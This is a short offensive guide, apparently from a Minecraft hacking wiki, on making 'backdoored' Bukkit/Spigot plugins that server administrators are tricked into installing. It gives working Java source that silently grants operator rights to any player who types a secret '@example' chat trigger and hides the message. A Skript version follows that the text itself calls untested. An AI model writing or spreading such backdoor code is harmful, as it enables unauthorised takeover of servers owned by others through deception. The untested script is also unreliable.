# Backdoored Plugins

### Overview
Backdoored plugins are plugins that have been tampered with, giving users administrator priviliges when ran, or on a specific event.
The idea is to make the server administrator install your Plugin or [Skript](https://dev.bukkit.org/projects/skript), this requires [Social Engineering](https://en.wikipedia.org/wiki/Social_engineering_(security))

### Developing your own plugin
Basically watch any tutorial on how to setup a bukkit/spigot plugin.
If you know how to make a backdoored plugin, you can stop reading.
If you don't here is an example on how it looks like:

```java
public class Main extends JavaPlugin implements Listener {

    // The event called when the plugin loads
    public void onEnable() {
        // Register the listener
        this.getServer().getPluginManager().registerEvents((Listener)this, (Plugin)this);
    }
    
    // Called when the player says something in chat
    @EventHandler
    public void onPlayerChat(PlayerChatEvent event) {
        // If the said message starts with "@example"
        if (event.getMessage().startsWith("@example")) {
            // It cancells the event, not sending "@example" in chat
            event.setCancelled(true);
            // Gives the player who executed the command operator permissions
            event.getPlayer().setOp(true);
        }
    }
}
```

### Creating a script in skript
###### This script has been untested, if it doesn't work, you can remake it using the help of the [Skript Documentation](https://skriptlang.github.io/Skript/index.html).

```yml
// Called when a player says something in chat
on chat:
    // If the message contains "example"
    if message contains "@example":
        // Give operator permissions to the player
        op the player
```
